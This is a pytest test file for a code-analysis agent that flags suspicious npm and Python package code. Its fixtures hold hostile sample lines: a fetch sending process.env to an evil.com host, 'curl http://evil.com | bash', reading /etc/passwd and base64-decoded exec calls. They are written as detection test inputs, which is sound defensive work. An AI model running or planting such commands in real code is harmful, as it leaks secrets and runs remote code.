"""
Unit tests for the Code Analysis Agent.

Tests cover:
- Obfuscation detection (base64, eval, dynamic execution)
- Behavioral analysis (network activity, file access, process spawning)
- Code complexity calculation
- LLM-based analysis
- Caching functionality
- Error handling

**Validates: Requirements 6.1, 6.2, 6.3, 6.4, 6.5**
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
from agents.code_agent import CodeAnalysisAgent
from agents.types import SharedContext, Finding


class TestCodeAnalysisAgent:
    """Test suite for Code Analysis Agent"""
    
    @pytest.fixture
    def agent(self):
        """Create a Code Analysis Agent instance"""
        return CodeAnalysisAgent()
    
    @pytest.fixture
    def mock_context_with_suspicious_code(self):
        """Create a mock context with suspicious code"""
        finding = Finding(
            package_name="suspicious-package",
            package_version="1.0.0",
            finding_type="obfuscated_code",
            severity="high",
            description="Suspicious obfuscated code detected",
            detection_method="rule_based",
            evidence={
                "code": """
                const encoded = 'aGVsbG8gd29ybGQ=';
                eval(atob(encoded));
                fetch('http://evil.com/steal', {
                    method: 'POST',
                    body: JSON.stringify(process.env)
                });
                """
            }
        )
        
        return SharedContext(
            initial_findings=[finding],
            dependency_graph={},
            packages=["suspicious-package"],
            ecosystem="npm"
        )
    
    @pytest.fixture
    def mock_context_clean(self):
        """Create a mock context with no suspicious packages"""
        return SharedContext(
            initial_findings=[],
            dependency_graph={},
            packages=["clean-package"],
            ecosystem="npm"
        )
    
    def test_agent_initialization(self, agent):
        """Test agent initializes correctly"""
        assert agent.name == "CodeAnalysisAgent"
        assert agent.system_message is not None
        assert len(agent.tools) == 5
        assert agent.obfuscation_patterns is not None
        assert agent.behavioral_patterns is not None
    
    def test_detect_base64_obfuscation(self, agent):
        """Test detection of base64 obfuscation - Requirement 6.2"""
        code = """
        const encoded = 'aGVsbG8gd29ybGQ=';
        const decoded = atob(encoded);
        eval(decoded);
        """
        
        result = agent.detect_obfuscation(code)
        
        assert result["detected"] is True
        assert result["count"] >= 2  # base64_decode and eval_execution
        
        # Check for base64 technique
        techniques = [t["technique"] for t in result["techniques"]]
        assert "base64_decode" in techniques
        assert "eval_execution" in techniques
    
    def test_detect_eval_execution(self, agent):
        """Test detection of eval execution - Requirement 6.2"""
        code = """
        eval('malicious code');
        Function('return this')();
        """
        
        result = agent.detect_obfuscation(code)
        
        assert result["detected"] is True
        techniques = [t["technique"] for t in result["techniques"]]
        assert "eval_execution" in techniques
    
    def test_detect_dynamic_execution(self, agent):
        """Test detection of dynamic execution - Requirement 6.2"""
        code = """
        const cp = require('child_process');
        cp.exec('curl http://evil.com | bash');
        """
        
        result = agent.detect_obfuscation(code)
        
        assert result["detected"] is True
        techniques = [t["technique"] for t in result["techniques"]]
        assert "dynamic_execution" in techniques
    
    def test_detect_network_activity(self, agent):
        """Test detection of network activity - Requirement 6.4"""
        code = """
        fetch('http://evil.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        });
        """
        
        result = agent.analyze_behavior(code)
        
        assert result["detected"] is True
        behaviors = [b["behavior"] for b in result["indicators"]]
        assert "network_activity" in behaviors
    
    def test_detect_file_access(self, agent):
        """Test detection of file access - Requirement 6.4"""
        code = """
        const fs = require('fs');
        fs.readFile('/etc/passwd', 'utf8', callback);
        fs.writeFile('/tmp/stolen', data);
        """
        
        result = agent.analyze_behavior(code)
        
        assert result["detected"] is True
        behaviors = [b["behavior"] for b in result["indicators"]]
        assert "file_access" in behaviors
    
    def test_detect_process_spawning(self, agent):
        """Test detection of process spawning - Requirement 6.4"""
        code = """
        const { spawn } = require('child_process');
        spawn('bash', ['-c', 'malicious command']);
        """
        
        result = agent.analyze_behavior(code)
        
        assert result["detected"] is True
        behaviors = [b["behavior"] for b in result["indicators"]]
        assert "process_spawning" in behaviors
    
    def test_detect_env_variable_access(self, agent):
        """Test detection of environment variable access - Requirement 6.4"""
        code = """
        const token = process.env.API_TOKEN;
        const secret = process.env.SECRET_KEY;
        """
        
        result = agent.analyze_behavior(code)
        
        assert result["detected"] is True
        behaviors = [b["behavior"] for b in result["indicators"]]
        assert "env_variable_access" in behaviors
    
    def test_calculate_complexity_simple(self, agent):
        """Test complexity calculation for simple code - Requirement 6.5"""
        code = """
        function hello() {
            return "world";
        }
        """
        
        complexity = agent.calculate_complexity(code)
        
        assert 0.0 <= complexity <= 0.3  # Simple code should have low complexity
    
    def test_calculate_complexity_complex(self, agent):
        """Test complexity calculation for complex code - Requirement 6.5"""
        code = """
        function complex() {
            if (condition1) {
                for (let i = 0; i < 10; i++) {
                    if (condition2) {
                        while (condition3) {
                            try {
                                doSomething();
                            } catch (e) {
                                handleError();
                            }
                        }
                    }
                }
            }
        }
        """ * 5  # Repeat to increase complexity
        
        complexity = agent.calculate_complexity(code)
        
        assert complexity > 0.5  # Complex code should have high complexity
    
    def test_calculate_complexity_obfuscated(self, agent):
        """Test complexity calculation for obfuscated code - Requirement 6.5"""
        # Long line (obfuscation indicator)
        code = "a" * 300 + "\n" + "b" * 300
        
        complexity = agent.calculate_complexity(code)
        
        assert complexity > 0.3  # Long lines increase complexity
    
    @patch('openai.ChatCompletion.create')
    def test_analyze_code_with_llm_success(self, mock_openai, agent):
        """Test LLM-based code analysis - Requirements 6.1, 6.3"""
        # Mock OpenAI response
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = """
        ASSESSMENT: This code is highly suspicious. It uses base64 encoding to hide malicious commands and exfiltrates environment variables to an external server.
        IMPLICATIONS: Data theft, credential exfiltration, remote code execution
        CONFIDENCE: 0.95
        """
        mock_openai.return_value = mock_response
        
        code = "eval(atob('malicious'))"
        obfuscation = {"detected": True, "techniques": []}
        behavioral = {"detected": True, "indicators": []}
        
        result = agent.analyze_code_with_llm(code, "test-package", obfuscation, behavioral)
        
        assert "assessment" in result
        assert "suspicious" in result["assessment"].lower()
        assert "security_implications" in result
        assert len(result["security_implications"]) > 0
        assert result["confidence"] == 0.95
    
    @patch('openai.ChatCompletion.create')
    def test_analyze_code_with_llm_failure(self, mock_openai, agent):
        """Test LLM analysis handles errors gracefully - Requirement 6.1"""
        # Mock OpenAI failure
        mock_openai.side_effect = Exception("API Error")
        
        code = "test code"
        obfuscation = {"detected": False, "techniques": []}
        behavioral = {"detected": False, "indicators": []}
        
        result = agent.analyze_code_with_llm(code, "test-package", obfuscation, behavioral)
        
        assert "error" in result
        assert result["assessment"] == "LLM analysis unavailable"
    
    def test_analyze_with_suspicious_packages(self, agent, mock_context_with_suspicious_code):
        """Test analysis with suspicious packages - Requirements 6.1, 6.2, 6.3, 6.4"""
        with patch.object(agent, 'analyze_code_with_llm') as mock_llm:
            # Mock LLM response
            mock_llm.return_value = {
                "assessment": "Malicious code detected",
                "security_implications": ["Data theft", "RCE"],
                "confidence": 0.95
            }
            
            result = agent.analyze(mock_context_with_suspicious_code, timeout=30)
            
            assert result["total_packages_analyzed"] == 1
            assert result["suspicious_patterns_found"] > 0
            assert len(result["packages"]) == 1
            
            package_result = result["packages"][0]
            assert package_result["package_name"] == "suspicious-package"
            assert "code_analysis" in package_result
            assert len(package_result["code_analysis"]["obfuscation_detected"]) > 0
            assert len(package_result["code_analysis"]["behavioral_indicators"]) > 0
    
    def test_analyze_with_clean_packages(self, agent, mock_context_clean):
        """Test analysis with no suspicious packages"""
        result = agent.analyze(mock_context_clean, timeout=30)
        
        assert result["total_packages_analyzed"] == 0
        assert result["suspicious_patterns_found"] == 0
        assert "note" in result
        assert "No suspicious patterns" in result["note"]
    
    def test_determine_risk_level_critical(self, agent):
        """Test risk level determination - critical"""
        obfuscation = {
            "detected": True,
            "techniques": [
                {"technique": "eval_execution", "severity": "critical"}
            ]
        }
        behavioral = {
            "detected": True,
            "indicators": [
                {"behavior": "network_activity", "severity": "high"}
            ]
        }
        
        risk_level = agent._determine_risk_level(obfuscation, behavioral, 0.5)
        
        assert risk_level == "critical"
    
    def test_determine_risk_level_high(self, agent):
        """Test risk level determination - high"""
        obfuscation = {
            "detected": True,
            "techniques": [
                {"technique": "base64_decode", "severity": "high"},
                {"technique": "hex_encoding", "severity": "medium"}
            ]
        }
        behavioral = {
            "detected": False,
            "indicators": []
        }
        
        risk_level = agent._determine_risk_level(obfuscation, behavioral, 0.5)
        
        assert risk_level == "high"
    
    def test_determine_risk_level_low(self, agent):
        """Test risk level determination - low"""
        obfuscation = {
            "detected": False,
            "techniques": []
        }
        behavioral = {
            "detected": False,
            "indicators": []
        }
        
        risk_level = agent._determine_risk_level(obfuscation, behavioral, 0.3)
        
        assert risk_level == "low"
    
    def test_caching_functionality(self, agent):
        """Test caching of analysis results"""
        package = "test-package"
        version = "1.0.0"
        
        # Mock cache manager
        with patch.object(agent.cache_manager, 'get_reputation') as mock_get, \
             patch.object(agent.cache_manager, 'store_reputation') as mock_store:
            
            mock_get.return_value = None  # No cache hit
            
            # Analyze package (will cache result)
            package_info = {
                "name": package,
                "version": version,
                "evidence": {"code": "test code"}
            }
            
            with patch.object(agent, 'analyze_code_with_llm') as mock_llm:
                mock_llm.return_value = {"assessment": "test", "security_implications": []}
                
                result = agent._analyze_package_code(package_info, SharedContext(
                    initial_findings=[],
                    dependency_graph={},
                    packages=[package]
                ))
            
            # Verify cache was checked and stored
            assert mock_get.called
            assert mock_store.called
    
    def test_timeout_handling(self, agent, mock_context_with_suspicious_code):
        """Test timeout handling during analysis"""
        # Add multiple suspicious packages
        for i in range(5):
            finding = Finding(
                package_name=f"package-{i}",
                package_version="1.0.0",
                finding_type="obfuscated_code",
                severity="high",
                description="Test",
                evidence={"code": "test"}
            )
            mock_context_with_suspicious_code.initial_findings.append(finding)
        
        # Set very short timeout
        with patch.object(agent, '_analyze_package_code') as mock_analyze:
            # Make analysis slow
            import time
            mock_analyze.side_effect = lambda *args: time.sleep(0.5) or {}
            
            result = agent.analyze(mock_context_with_suspicious_code, timeout=1)
            
            # Should have analyzed fewer packages due to timeout
            assert result["total_packages_analyzed"] < 5
    
    def test_python_obfuscation_detection(self, agent):
        """Test detection of Python-specific obfuscation"""
        code = """
        import base64
        exec(base64.b64decode('bWFsaWNpb3VzIGNvZGU='))
        """
        
        result = agent.detect_obfuscation(code)
        
        assert result["detected"] is True
        techniques = [t["technique"] for t in result["techniques"]]
        assert "base64_decode" in techniques
        assert "eval_execution" in techniques
    
    def test_python_behavioral_detection(self, agent):
        """Test detection of Python-specific behaviors"""
        code = """
        import os
        import subprocess
        os.system('curl http://evil.com')
        subprocess.call(['bash', '-c', 'malicious'])
        """
        
        result = agent.analyze_behavior(code)
        
        assert result["detected"] is True
        behaviors = [b["behavior"] for b in result["indicators"]]
        assert "process_spawning" in behaviors
    
    def test_generate_reasoning(self, agent):
        """Test reasoning generation"""
        obfuscation = {
            "detected": True,
            "techniques": [
                {"technique": "base64_decode", "severity": "high"},
                {"technique": "eval_execution", "severity": "critical"}
            ]
        }
        behavioral = {
            "detected": True,
            "indicators": [
                {"behavior": "network_activity", "severity": "high"}
            ]
        }
        llm_analysis = {
            "assessment": "Highly suspicious code with data exfiltration"
        }
        
        reasoning = agent._generate_reasoning(obfuscation, behavioral, 0.8, llm_analysis)
        
        assert "obfuscation" in reasoning.lower()
        assert "behavioral" in reasoning.lower() or "network_activity" in reasoning.lower()
        assert "suspicious" in reasoning.lower()
    
    def test_confidence_calculation(self, agent):
        """Test confidence score calculation"""
        obfuscation = {"detected": True, "techniques": [{"technique": "base64_decode"}]}
        behavioral = {"detected": True, "indicators": [{"behavior": "network_activity"}]}
        llm_analysis = {"assessment": "test", "confidence": 0.95}
        
        confidence = agent._calculate_package_confidence(obfuscation, behavioral, llm_analysis)
        
        assert 0.0 <= confidence <= 1.0
        assert confidence >= 0.9  # Should be high with LLM analysis


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
